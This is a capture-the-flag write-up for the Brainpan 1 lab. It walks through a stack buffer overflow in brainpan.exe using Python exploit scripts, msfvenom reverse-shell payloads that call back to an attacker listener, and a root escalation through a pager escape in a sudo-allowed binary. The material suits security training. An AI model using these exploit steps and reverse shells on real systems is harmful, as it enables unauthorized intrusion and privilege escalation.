# Brainpan 1 Write-up

Difficulty: Hard

Task: Reverse engineer a Windows executable, identify a buffer overflow, and exploit it to gain a shell on the target machine.

## Reconnaissance
I began by running an nmap scan to identify open ports and services, including where the executable was being hosted.
``` bash
nmap -sC -sV -p- <TARGET_IP>
```
Result:

- 9999/tcp: open (abyss/brainpan)

- 10000/tcp: open (http, SimpleHTTPServer 0.6)

I connected to port 9999 using Netcat to investigate the service. The server prompted for a password, which I could not guess. 
I then visited port 10000, where I used ffuf to enumerate hidden directories. I found a /bin directory containing brainpan.exe.

## Reverse Engineering
I downloaded brainpan.exe and inspected the file. It was a PE32 executable (console) Intel 80386 (stripped, for MS Windows). 
Using the strings utility, I found the word ‘shitstorm’. I tried this as the password on port 9999, which was accepted, but the application did not perform any additional actions.

I transferred the executable to my local environment to debug it. I ran the server locally using x32dbg to prepare for the exploitation phase.

## Buffer Overflow Exploitation

### 1. Finding the EIP Offset
I started by sending 500 'A' characters, which did not crash the server. After increasing the payload to 1,000 'A's, the server crashed, and the EIP register was overwritten with 0x41414141.

I used the Metasploit pattern tools to determine the exact offset.

## Create Pattern:
``` bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
``` 
After sending the generated pattern, the EIP returned 0x35724134.
## Calculate Offset:
``` bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 35724134
```
Result: 
``` bash
Exact match at offset 524.
```
I verified the offset by crafting a Python script to overwrite the EIP with 0x42424242 ('BBBB').

brainpan.py:
``` python
#!/usr/bin/python3 
import sys, socket

shellcode = b"A" * 524 + b"B" * 4

try:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect(('<TARGET_IP>', 9999))
   data = s.recv(1024)
   s.send(shellcode + b"\n")
   s.close()
   print("Payload sent successfully")
except Exception as e:
   print(f"Error connecting to server: {e}")
```
The EIP was successfully overwritten with 0x42424242.

### 2. Identifying Bad Characters
I sent a byte array containing hex values from 0x01 to 0xff to check for bad characters. 

badchar.py:
``` python
badchar.py

#!/usr/bin/python3 
import sys, socket

badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
    b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
    b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
    b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
    b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
    b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
    b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
    b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
    b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
    b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
    b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
    b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
    b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

offset = 524
eip_overwrite = b"BBBB"

payload = b"A" * offset + eip_overwrite + badchars

try:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect(('TARGET_IP', 9999))

   data = s.recv(1024)
   s.send(payload)

   s.close()
   print("Payload sent successfully")

except Exception as e:
   print(f"Error connecting to server: {e}")
   sys.exit()
```
The only identified bad character was the null byte (\x00).

### 3. Locating JMP ESP
In x32dbg, I searched the current module for the JMP ESP instruction to redirect the EIP.
```
Result: Address 0x311712F3.
Converted to little-endian for the payload: \xF3\x12\x17\x31.
```
## Initial Access
I generated the initial shellcode using msfvenom for Windows, assuming the target environment would match the binary type:
``` bash
msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -a x86 --platform windows -b "\x00" -f python
```
After executing the exploit and setting up my listener, I obtained a shell, but I immediately noticed that the environment was not behaving like a standard Windows system.
Many commands were disabled or failed to execute, and the system behavior felt like Linux. To fix this, I re-generated my shellcode specifically for the Linux architecture:
``` bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -b "\x00" -f python
```
With the new payload ready, I updated my rce.py script

rce.py:
``` python
#!/usr/bin/python3
import socket

target_ip = '<TARGET_IP>'
target_port = 9999

offset = 524
jmp_esp = b"\xF3\x12\x17\x31"
nop_sled = b"\x90" * 16

# Insert the NEW linux shellcode here
buf = b"..." 

payload = b"A" * offset + jmp_esp + nop_sled + buf

try:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((target_ip, target_port))
   s.recv(1024)
   s.send(payload + b"\n")
   print("Exploit sent! Checking for connection...")
   s.close()
except Exception as e:
   print(f"Error: {e}")
```
I then set up my listener in Metasploit to match the new payload:
``` bash
use exploit/multi/handler
set payload linux/x86/shell_reverse_tcp
set LHOST <YOUR_IP>
set LPORT 4444
run
```
Once I executed the script again, I was successfully dropped into a stable shell within the Linux environment.

## Root Escalation
I checked for sudo privileges:
``` bash
sudo -l
```
The output showed I could run /home/anansi/bin/anansi_util as root. I inspected the binary:
``` bash
sudo /home/anansi/bin/anansi_util
# Usage: /home/anansi/bin/anansi_util [action]
# Where [action] is one of:
#   - network
#   - proclist
#   - manual [command]
```
The manual option looked promising. I tested it with "ls":
``` bash
sudo /home/anansi/bin/anansi_util manual "ls"
```
Result:
``` bash
No manual entry for manual
WARNING: terminal is not fully functional
-  (press RETURN)[I_CAN_TYPE_HERE]
```
This launched a terminal pager, which allows for command execution. I entered !/bin/bash into the pager to escape to a root shell.
